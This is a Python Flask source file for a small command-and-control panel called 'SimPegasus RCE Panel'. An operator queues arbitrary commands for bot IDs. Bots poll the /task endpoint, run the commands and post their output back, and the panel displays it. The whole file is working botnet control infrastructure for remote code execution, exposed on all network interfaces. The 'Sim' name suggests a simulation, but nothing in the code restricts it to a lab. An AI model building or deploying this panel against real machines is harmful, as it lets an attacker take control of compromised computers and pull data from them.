from flask import Flask, request, render_template_string, redirect, url_for
from datetime import datetime

app = Flask(__name__)
tasks = {}
results = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>SimPegasus RCE Panel</title>
</head>
<body>
    <h2>SimPegasus RCE Command Control</h2>
    <form method="POST" action="/send">
        <label>Bot ID:</label><br>
        <input name="bot" required><br><br>
        <label>Command:</label><br>
        <input name="cmd" size="60" required><br><br>
        <button type="submit">Send Command</button>
    </form>

    <h3>Last Received Results:</h3>
    {% for bot, out in results.items() %}
        <b>{{bot}}:</b><br><pre>{{out}}</pre><hr>
    {% endfor %}
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE, results=results)

@app.route('/send', methods=['POST'])
def send():
    bot = request.form.get("bot")
    cmd = request.form.get("cmd")
    tasks[bot] = cmd
    return redirect(url_for('index'))

@app.route('/task', methods=['GET'])
def task():
    bot_id = request.args.get("id")
    return tasks.pop(bot_id, "NONE")

@app.route('/result', methods=['POST'])
def result():
    bot_id = request.form.get("id")
    output = request.form.get("output", "")
    results[bot_id] = f"[{datetime.now()}]\n{output}"
    return "OK"

if __name__ == '__main__':
    print("🌐 Open http://localhost:8000 in browser")
    app.run(host="0.0.0.0", port=8000)
